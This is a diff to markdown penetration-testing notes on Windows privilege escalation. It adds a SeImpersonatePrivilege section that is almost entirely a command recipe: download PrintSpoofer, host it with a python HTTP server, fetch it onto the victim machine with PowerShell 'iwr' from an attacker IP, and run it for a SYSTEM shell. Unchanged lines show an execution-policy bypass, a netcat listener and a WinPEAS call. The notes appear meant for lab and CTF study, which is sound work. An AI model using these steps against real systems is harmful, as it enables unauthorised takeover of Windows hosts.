@@ -299,6 +299,30 @@ powershell -ep bypass .\escalate.ps1
 nc -lvp 1234
 ```
 
+## SeImpersonatePrivilege
+
+```
+# Elevating Privileges using PrintSpoofer 
+
+# Download PrintSpoofer.exe
+https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe
+
+# Share the executable using python http server
+python3 -m http.server
+
+# Download the executable in the victim machine
+cd C:\Windows\Temp
+powershell iwr -Uri http://10.17.6.228:8080/PrintSpoofer.exe -OutFile pf.exe
+
+# Execute
+pf.exe -i -c cmd
+
+# Output
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
 ## WinPEAS Script
 
 [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
@@ -306,3 +330,16 @@ nc -lvp 1234
 ```
 .\winpeas.bat
 ```
+
+
+
+
+
+***
+
+## REFERENCES
+
+* [https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/)
+* [https://pentest.whitehatlabs.tech/windows-privilege-escalation/windows-privilege-escalation](https://pentest.whitehatlabs.tech/windows-privilege-escalation/windows-privilege-escalation)
+* [https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/windows/relevant](https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/windows/relevant)
+* [https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASbat](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASbat)
